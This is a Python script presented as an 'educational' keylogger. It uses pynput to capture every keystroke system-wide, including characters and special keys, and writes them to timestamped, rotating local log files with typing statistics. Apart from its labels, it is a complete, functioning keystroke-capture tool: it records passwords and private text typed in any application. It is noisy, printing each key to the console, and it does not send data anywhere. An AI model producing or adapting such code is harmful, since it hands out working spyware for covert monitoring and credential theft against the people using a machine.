import pynput
from pynput.keyboard import Key, Listener
import datetime
import os
import threading
import json
import time
from pathlib import Path
from collections import Counter, defaultdict

class EducationalKeyLogger:
    """
    EDUCATIONAL KEYLOGGER - FOR LEARNING PURPOSES ONLY
    
    This demonstrates various programming concepts:
    - File I/O operations
    - Event-driven programming
    - Data structures and analysis
    - Threading and synchronization
    - Object-oriented programming
    - Exception handling
    """
    
    def __init__(self, log_dir="educational_logs", max_file_size=1024*1024):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(exist_ok=True)
        self.max_file_size = max_file_size
        self.current_file = None
        
        # Educational data structures
        self.key_buffer = []
        self.buffer_size = 15  # Reduced for demonstration
        self.buffer_lock = threading.Lock()
        
        # Analytics for learning
        self.key_statistics = Counter()
        self.special_key_count = 0
        self.regular_key_count = 0
        self.session_start = None
        self.words_typed = 0
        self.last_key_time = None
        self.key_intervals = []
        
        self.create_new_log_file()
        self.print_educational_info()
    
    def print_educational_info(self):
        """Display educational information about the program"""
        print("\n" + "="*60)
        print("EDUCATIONAL KEYLOGGER - FOR LEARNING PURPOSES ONLY")
        print("="*60)
        print("This program demonstrates:")
        print("• File I/O operations with rotation")
        print("• Event-driven programming patterns")
        print("• Threading and resource synchronization")
        print("• Data structures (Counter, defaultdict)")
        print("• Object-oriented design principles")
        print("• Exception handling and cleanup")
        print("• Keyboard event processing")
        print("• Performance optimization with buffering")
        print("="*60)
        print("Press ESC to stop logging and view analytics")
        print("="*60 + "\n")
    
    def create_new_log_file(self):
        """Demonstrate file management with timestamps"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.current_file = self.log_dir / f'key_log_{timestamp}.txt'
        self.session_start = datetime.datetime.now()
        
        print(f"[FILE_MGMT] Created new log file: {self.current_file}")
        
        # Write educational header
        header = f"""
EDUCATIONAL KEY LOG - FOR LEARNING PURPOSES ONLY
Session Started: {self.session_start}
File: {self.current_file.name}
        
This file demonstrates:
- Real-time keyboard event capture
- Special key normalization
- Timestamped logging
- File rotation management

Keystroke Log:
{"="*50}
"""
        self._write_to_file(header)
    
    def check_file_size(self):
        """Demonstrate file size monitoring"""
        if self.current_file.exists():
            size = self.current_file.stat().st_size
            if size >= self.max_file_size:
                print(f"[FILE_MGMT] File rotation needed: {size} bytes")
                return True
        return False
    
    def _write_to_file(self, content):
        """Demonstrate direct file I/O operations"""
        try:
            with open(self.current_file, 'a', encoding='utf-8') as f:
                f.write(content)
        except Exception as e:
            print(f"[ERROR] File write failed: {e}")
    
    def flush_buffer(self):
        """Demonstrate buffer management and batch processing"""
        with self.buffer_lock:
            if not self.key_buffer:
                return
            
            if self.check_file_size():
                print("[BUFFER_MGMT] Rotating log file due to size limit")
                self.create_new_log_file()
            
            try:
                batch_content = ''.join(self.key_buffer)
                self._write_to_file(batch_content)
                self.key_buffer.clear()
                print(f"[BUFFER_MGMT] Flushed {len(batch_content)} characters")
            except Exception as e:
                print(f"[ERROR] Buffer flush failed: {e}")
    
    def add_to_buffer(self, text):
        """Demonstrate producer-consumer pattern with buffers"""
        current_time = time.time()
        
        # Calculate typing speed metrics
        if self.last_key_time is not None:
            interval = current_time - self.last_key_time
            self.key_intervals.append(interval)
        
        self.last_key_time = current_time
        
        with self.buffer_lock:
            self.key_buffer.append(text)
            
            # Word count estimation (educational)
            if text == ' ' or text == '\n':
                self.words_typed += 1
            
            if len(self.key_buffer) >= self.buffer_size:
                print(f"[BUFFER_MGMT] Buffer full, triggering flush")
                self.flush_buffer()
    
    def on_press(self, key):
        """Demonstrate event handling and key processing"""
        try:
            # Update key statistics
            self.key_statistics['total_keys'] += 1
            
            # Handle regular characters
            if hasattr(key, 'char') and key.char is not None:
                self.regular_key_count += 1
                self.key_statistics['regular_keys'] += 1
                self.key_statistics[key.char] += 1
                
                self.add_to_buffer(key.char)
                print(f'[KEY_EVENT] Character: {key.char}')
                
            else:
                # Handle special keys
                self.special_key_count += 1
                self.key_statistics['special_keys'] += 1
                
                special_keys = {
                    Key.space: (' ', 'SPACE'),
                    Key.enter: ('\n', 'ENTER'),
                    Key.tab: ('\t', 'TAB'),
                    Key.backspace: ('[BACKSPACE]', 'BACKSPACE'),
                    Key.delete: ('[DELETE]', 'DELETE'),
                    Key.shift: ('[SHIFT]', 'SHIFT'),
                    Key.ctrl: ('[CTRL]', 'CTRL'),
                    Key.alt: ('[ALT]', 'ALT'),
                }
                
                if key in special_keys:
                    char, name = special_keys[key]
                    self.add_to_buffer(char)
                    self.key_statistics[name] += 1
                    print(f'[KEY_EVENT] Special: {name}')
                else:
                    key_name = f'[{key.name.upper()}]' if hasattr(key, 'name') else f'[{key}]'
                    self.add_to_buffer(key_name)
                    self.key_statistics['other_special'] += 1
                    print(f'[KEY_EVENT] Other: {key_name}')
                    
        except Exception as e:
            print(f"[ERROR] Key processing failed: {e}")
    
    def on_release(self, key):
        """Demonstrate event-driven control flow"""
        if key == Key.esc:
            print("\n[CONTROL] ESC pressed, initiating shutdown...")
            # Final buffer flush
            self.flush_buffer()
            # Display educational analytics
            self.display_analytics()
            return False
    
    def display_analytics(self):
        """Demonstrate data analysis on collected information"""
        session_duration = datetime.datetime.now() - self.session_start
        
        print("\n" + "="*60)
        print("EDUCATIONAL ANALYTICS - SESSION SUMMARY")
        print("="*60)
        print(f"Session Duration: {session_duration}")
        print(f"Total Keys Pressed: {self.key_statistics['total_keys']}")
        print(f"Regular Keys: {self.regular_key_count}")
        print(f"Special Keys: {self.special_key_count}")
        print(f"Estimated Words: {self.words_typed}")
        
        if self.key_intervals:
            avg_interval = sum(self.key_intervals) / len(self.key_intervals)
            print(f"Average Key Interval: {avg_interval:.3f} seconds")
            print(f"Typing Speed: {60/avg_interval if avg_interval > 0 else 0:.1f} KPM")
        
        print("\nMost Frequent Keys:")
        for key, count in self.key_statistics.most_common(10):
            if len(str(key)) == 1:  # Single characters only
                print(f"  '{key}': {count} times")
        
        print(f"\nLog File: {self.current_file}")
        print("="*60)
    
    def start(self):
        """Demonstrate main program lifecycle"""
        print("[SYSTEM] Starting educational keylogger...")
        try:
            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                print("[SYSTEM] Listener active - capturing keyboard events")
                listener.join()
        except Exception as e:
            print(f"[ERROR] System failure: {e}")
        finally:
            # Demonstrate proper resource cleanup
            self.flush_buffer()
            print("[SYSTEM] Educational session completed")

def main():
    """
    Main function demonstrating:
    - Program initialization
    - Configuration management
    - Clean execution flow
    """
    # Educational configuration
    CONFIG = {
        'log_directory': "educational_keylogs",
        'max_file_size': 512 * 1024,  # 512KB for demonstration
    }
    
    print("Initializing Educational Keylogger...")
    print("This is for learning programming concepts only!")
    
    # Create and start the educational logger
    keylogger = EducationalKeyLogger(
        log_dir=CONFIG['log_directory'],
        max_file_size=CONFIG['max_file_size']
    )
    
    keylogger.start()

# Educational note about the __name__ check
if __name__ == "__main__":
    """
    This conditional demonstrates Python module execution:
    - Code only runs when script is executed directly
    - Prevents execution when imported as module
    - Common Python idiom for executable scripts
    """
    main()
